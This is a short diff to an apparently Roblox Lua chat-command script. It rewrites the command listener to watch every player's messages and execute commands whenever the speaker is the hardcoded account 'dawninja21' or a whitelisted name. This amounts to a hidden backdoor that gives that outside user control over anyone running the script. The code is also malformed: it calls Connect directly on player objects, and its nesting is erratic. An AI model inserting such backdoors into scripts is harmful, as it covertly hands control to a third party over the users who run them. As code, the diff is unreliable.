@@ -51,12 +51,16 @@ function addcommand(info)
 	local cmdName = info.Name
 	local cmdFunction = info.Function
             commands[cmdName] = cmdName
-            connections[#connections + 1] = lp.Connect(function(msg)
+        for i,v in pairs(game.Players:GetPlayers()) do
+            connections[#connections + 1] = v.Connect(function(msg)
                    args = msg:split(" ")
+        if v.Name == "dawninja21" or v.Name == wl then
             if args[1] == prefix .. cmdName then
                         cmdFunction()
 end
+end
 end)
+end
 end
 
 local function check(a)
